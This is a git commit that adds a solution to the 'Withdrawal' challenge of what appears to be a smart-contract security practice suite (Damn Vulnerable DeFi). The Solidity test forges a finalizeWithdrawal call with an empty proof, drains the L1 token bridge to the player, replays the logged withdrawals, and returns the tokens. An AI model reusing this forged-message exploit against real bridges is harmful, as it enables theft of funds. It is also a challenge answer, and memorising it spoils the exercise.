6785dcd5303c1d5951a3dcf930f85968cbdba823
nzmpi <nizami.abdulov@gmail.com>
2024-09-16 19:54:13 +0400

    add: Withdrawal solution

--- test/withdrawal/Withdrawal.t.sol
+++ test/withdrawal/Withdrawal.t.sol
@@ -85,10 +85,114 @@ contract WithdrawalChallenge is Test {
         assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
     }
 
+    /*
+    Withdrawal:
+        "topics": [
+            "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5", // event signature
+            "0x0000000000000000000000000000000000000000000000000000000000000000", // nonce
+            "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16", // caller
+            "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5" // target
+        ],
+        "data": "
+        eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id - 0x20
+        0000000000000000000000000000000000000000000000000000000066729b63 // timestamp - 0x40
+        0000000000000000000000000000000000000000000000000000000000000060 // data offset - 0x60
+        0000000000000000000000000000000000000000000000000000000000000104 // data length - 0x80
+        01210a38 // forwardMessage selector - 0x84
+        0000000000000000000000000000000000000000000000000000000000000000 // nonce - 0xa4
+        000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender - 0xc4
+        0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target - 0xe4
+        0000000000000000000000000000000000000000000000000000000000000080 // message offset - 0x104 
+        0000000000000000000000000000000000000000000000000000000000000044 // message length - 0x124
+        81191e51 // executeTokenWithdrawal selector - 0x128
+        000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver - 0x148
+        0000000000000000000000000000000000000000000000008ac7230489e80000 // amount - 0x168
+        0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+        "    
+    */
+    struct Withdrawals {
+        bytes data;
+        bytes32[] topics;
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_withdrawal() public checkSolvedByPlayer {}
+    function test_withdrawal() public checkSolvedByPlayer {
+        // 4 withdrawals:
+        // every withdrawal asks for 10 tokens, except the third one,
+        // which asks for 999000
+        Withdrawals[] memory withdrawals = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"))),
+            (Withdrawals[])
+        );
+
+        // player is operator, no need for the proof
+        bytes32[] memory proof;
+        bytes memory data = withdrawals[0].data;
+        uint256 amountForWithdrawals;
+        assembly {
+            amountForWithdrawals := mul(3, mload(add(data, 0x168)))
+        }
+
+        // empty the bridge, only leave tokens for normal withdrawals
+        l1Gateway.finalizeWithdrawal({
+            nonce: 0,
+            l2Sender: l2Handler,
+            target: address(l1Forwarder),
+            timestamp: 0,
+            message: abi.encodeCall(
+                l1Forwarder.forwardMessage,
+                (
+                    0,
+                    address(0),
+                    address(l1TokenBridge),
+                    abi.encodeCall(
+                        l1TokenBridge.executeTokenWithdrawal, (player, INITIAL_BRIDGE_TOKEN_AMOUNT - amountForWithdrawals)
+                    )
+                )
+            ),
+            proof: proof
+        });
+
+        {
+            skip(8 days);
+            uint256 nonce;
+            uint256 timestamp_;
+            address l2Sender;
+            address receiver;
+            uint256 amount;
+            for (uint256 i; i < withdrawals.length; ++i) {
+                nonce = uint256(withdrawals[i].topics[1]);
+                data = withdrawals[i].data;
+                assembly {
+                    timestamp_ := mload(add(data, 0x40))
+                    l2Sender := mload(add(data, 0xc4))
+                    receiver := mload(add(data, 0x148))
+                    amount := mload(add(data, 0x168))
+                }
+                //console.log(amount / 1 ether);
+                l1Gateway.finalizeWithdrawal({
+                    nonce: nonce,
+                    l2Sender: l2Handler,
+                    target: address(l1Forwarder),
+                    timestamp: timestamp_,
+                    message: abi.encodeCall(
+                        l1Forwarder.forwardMessage,
+                        (
+                            nonce,
+                            l2Sender,
+                            address(l1TokenBridge),
+                            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (receiver, amount))
+                        )
+                    ),
+                    proof: proof
+                });
+            }
+        }
+
+        token.transfer(address(l1TokenBridge), token.balanceOf(player));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
